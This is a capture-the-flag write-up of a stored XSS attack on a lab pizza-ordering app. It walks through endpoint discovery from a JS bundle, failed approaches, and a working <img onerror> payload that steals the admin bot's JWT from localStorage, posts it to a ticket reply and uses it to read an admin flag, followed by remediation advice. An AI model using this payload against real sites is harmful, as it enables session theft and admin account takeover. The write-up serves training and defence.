---
title: Cheesy Does It - XSS
tags:
  - bugforge
  - xss
  - stored-xss
  - account-takeover
aliases:
  - "/bugforge/cheesy-does-it-xss/"
  - "/BugForge/Cheesy-Does-It---XSS"
---
- Third time visiting Cheesy Does It and today was a completely different beast
- I went down several rabbit holes before landing the flag - documenting those here because they're quite instructive

## Reconnaissance

1. SPA detected, 32 API endpoints extracted from the JS bundle
2. Source map probe returned HTML (fake/disabled), so no raw source files available
3. Beautified the main JS bundle and started reading

### Endpoints Discovered

```
POST /api/register              - Create account
POST /api/login                 - Login (returns JWT)
GET  /api/verify-token          - Verify JWT, returns user object
PUT  /api/profile               - Update profile
GET  /api/menu/pizzas           - Menu
POST /api/payment/validate      - Card validation
POST /api/payment/process       - Process payment
POST /api/orders                - Place order
GET  /api/orders/:id            - View order
POST /api/tickets               - Create support ticket
GET  /api/tickets               - List my tickets
GET  /api/tickets/:id           - View ticket + replies
POST /api/tickets/:id/replies   - Reply to ticket
GET  /api/rewards               - Loyalty points
GET  /api/admin/tickets         - Admin: list all tickets
GET  /api/admin/users           - Admin: list users
GET  /api/admin/coupons         - Admin: coupons
GET  /api/admin/stats           - Admin: dashboard stats
GET  /api/admin/flag            - Admin: flag endpoint
```

### JS Analysis - The Critical Finding

Searching the beautified JS for dangerous patterns:

```bash
grep -n "dangerouslySetInnerHTML" main.851582bd.js
```

Found at line 18137 -- inside the admin ticket list table component:

```javascript
(0,kt.jsx)("div",{
  dangerouslySetInnerHTML:{
    __html:e.message
  }
})
```

This means: when an admin views their ticket dashboard, every ticket's `message` field is rendered as raw HTML. No sanitization. Classic Stored XSS sink.

### Auth Structure

- JWT with HS256, claims: `{id, username, iat}` - no `role` claim, role checked server-side
- Token stored in `localStorage.getItem('token')`
- Admin endpoints return 403 "Admin access required" for non-admin tokens
- Mass assignment on register/profile does NOT work for `role` field

## Initial Approach (What Failed)

### Attempt 1: Mass Assignment

Tried registering with `"role": "admin"` and updating profile with `"role": "admin"` - both silently ignored. Server-side allowlist on writable fields.

### Attempt 2: XSS Exfiltration via localStorage.flag

Based on a previous challenge (Ottergram), I assumed the flag would be stored in `localStorage.getItem('flag')` on the admin bot's browser. Spent several payloads trying to exfil this value.

Result: `FLAG=null` - the flag is NOT in localStorage on this challenge. Different architecture than Ottergram.

### Attempt 3: Exfil via User Ticket Replies

Tried having the XSS payload post to `/api/tickets/:id/replies` (user endpoint). This works but the bot was not firing on my first batch of payloads. I later realized the bot has a ~60 second polling interval - patience was the real issue, not the payload.

### Attempt 4: Wrong Ticket ID in Payload

Since ticket IDs are sequential and assigned server-side, I couldn't predict the ID of the ticket I was about to create. Several payloads referenced a ticket ID that didn't exist yet. Solution: create a "landing pad" ticket first, then submit the XSS payload targeting that known ID.

## The Working Attack

### Step 1: Register Users and Get Tokens

```http
POST /api/register
Content-Type: application/json

{"username":"bob","email":"bob@test.com","password":"Password123!"}
```

Response includes JWT. Registered two users for testing.

### Step 2: Create a "Landing Pad" Ticket

This is the ticket where the admin bot will deposit the exfiltrated token as a reply:

```http
POST /api/tickets
Authorization: Bearer <my-token>
Content-Type: application/json

{"subject":"Order never arrived","message":"placeholder"}
```

Response: `{"id": 25, "message": "Support ticket created"}`

Now I know ticket 25 exists and I can read its replies.

### Step 3: Submit XSS Payload

The payload uses the admin ticket reply endpoint (since the bot IS admin):

```http
POST /api/tickets
Authorization: Bearer <my-token>
Content-Type: application/json

{
  "subject": "Refund request",
  "message": "<img src=x onerror=\"fetch('/api/admin/tickets/25/replies',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},body:JSON.stringify({message:localStorage.getItem('token')})})\">"
}
```

**Why this payload works:**
- `<img src=x>` - the broken image source triggers `onerror` immediately when rendered via `innerHTML`
- `localStorage.getItem('token')` - the admin bot's browser has the admin JWT in localStorage (same pattern as the React app's auth flow)
- `fetch('/api/admin/tickets/25/replies', ...)` -- posts the admin token as a reply to my ticket (which I can read)
- Uses the admin's OWN token in the Authorization header for the reply endpoint

### Step 4: Wait for Bot (~60 seconds)

The admin bot periodically renders the ticket list page. When it does, `dangerouslySetInnerHTML` injects our `<img>` tag, the `onerror` fires, and the admin token gets posted as a reply.

### Step 5: Read the Exfiltrated Token

```http
GET /api/tickets/25
Authorization: Bearer <my-token>
```

Response:
```json
{
  "replies": [{
    "id": 20,
    "message": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc4MDMzNTU3Nn0.fjdQ8aGfk38_H76D-NWCnL3W1ThavtVNfAcsfwB8-u8",
    "is_staff": 1,
    "username": "admin"
  }]
}
```

Admin token captured. Decoded: `{"id":1,"username":"admin","iat":1780335576}`

### Step 6: Access Admin Flag Endpoint

```http
GET /api/admin/flag
Authorization: Bearer <admin-token>
```

```json
{"flag":"bug{D7HD6XaR3NXxngrh11wnCFUzq2K5PqK7}"}
```

## Lessons Learned

1. **Don't assume flag location from past challenges** - I wasted time trying to exfil `localStorage.flag` which was null. Each lab has its own architecture
2. **Patience with bot timing** - The bot polls every ~60 seconds. I nearly abandoned the XSS vector because early checks showed no reply. Just needed to wait
3. **Two-step landing pad technique** - When you can't predict your own ticket ID, create a ticket first, note the ID, then submit the payload targeting that ID
4. **Admin endpoints for exfil** - The bot is admin, so payloads should use admin-tier endpoints (`/api/admin/tickets/:id/replies`) rather than user endpoints
5. **innerHTML sink selection** - `<script>` tags do NOT execute when injected via innerHTML/dangerouslySetInnerHTML. Must use event handlers: `<img onerror>`, `<svg onload>`, `<details ontoggle>`

## Security Takeaways

### Vulnerability

Stored XSS via `dangerouslySetInnerHTML` in admin ticket list - user-submitted ticket messages rendered as raw HTML in the admin dashboard without sanitization.

### Impact

- Full Admin Account Takeover: Steal admin JWT from any user account
- Access to all admin functionality (user data, orders, coupons, stats)
- Persistent: payload fires every time admin views tickets
- Zero interaction required from victim beyond normal workflow

### Remediation

- Never use `dangerouslySetInnerHTML` with user-controlled content
- Sanitize HTML server-side before storage (DOMPurify, bleach, etc.)
- Implement Content Security Policy (CSP) to block inline script execution
- Consider using React's default text rendering (`children` prop) which auto-escapes HTML
- HttpOnly cookies instead of localStorage tokens to prevent JS-based token theft
